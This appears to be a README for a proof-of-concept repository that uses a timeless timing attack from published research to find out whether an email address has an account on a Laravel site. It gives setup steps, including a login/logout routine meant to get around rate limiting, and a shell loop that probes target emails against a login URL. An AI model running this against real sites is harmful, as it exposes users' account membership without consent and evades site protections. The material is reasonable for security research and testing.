# User enumeration through timeless timing attack in Laravel

This repository works as a demo to exploit the user enumeration vulnerability in Laravel.

The script is build on [Timeless Timing Attack](https://tom.vg/papers/timeless-timing-attack_usenix2020.pdf) by Tom Van Goethem et al.
The repository containing the proof of concept script h2time (which is part of this demo) can be found on https://github.com/DistriNet/timeless-timing-attacks 

## Pre-requisites

 - The site must have CSRF protection disabled. If it is enabled you have to obtain a valid CSRF token before trying to login.
 - You - as the attacker - must know one valid email and password combination on the target site.

## How to run

 - In `h2time.py` there is a built in login+logout for each 4 request pairs to the server to prevent the application from doing rate limiting.
This has to be amended to match a known user+password combination on the target site.
 - In `laravel.py` post_data must contain the email you want to test if exists on the target site.
 - In `laravel.py` post_data2 must contain an email you know exists on the target site. The password must be wrong, so that it does not login.

 - Run the script with the following command:

```bash
python3 laravel.py
```

The script will tell you which request from the request-pair that most of the times took longest to return.
If it "could not determine winner" that means they generally took the same time to return meaning the email under test exists on the server.

## Contributions

Tom Van Goethem et al (Timeless timing attacks)

[Jens Just Iversen](https://ephort.dk) (laravel user enumation)


## Geoff's notes
`while sleep 61; do python laravel.py {login URL} {registered email} {target email} {"local"|"remote"|"distant"} {"control"|"attack"}; done`  
I.e.  
`while sleep 61; do python laravel.py https://laravel7app.com/login known-registered-account@gmail.com target@gmail.com local control; done`  
Switch final arg "control" to "attack" to probe the target user account
  
Filenames are like this
```
results/local_control_detail.csv
results/local_control_winners.csv
results/remote_control_detail.csv
results/remote_control_winners.csv
results/distant_control_detail.csv
results/distant_control_winners.csv
results/local_target_detail.csv
results/local_target_winners.csv
results/remote_target_detail.csv
results/remote_target_winners.csv
results/distant_target_detail.csv
results/distant_target_winners.csv

```

Detail files have contents like this:
```
66904389,302,302
69115705,302,302
54883308,302,302
66942454,302,302
64316212,302,302
67685984,302,302
68458219,302,302
59474604,302,302
74394309,302,302
77712399,302,302
```

Winners files have contents like this:
```
2
2
```
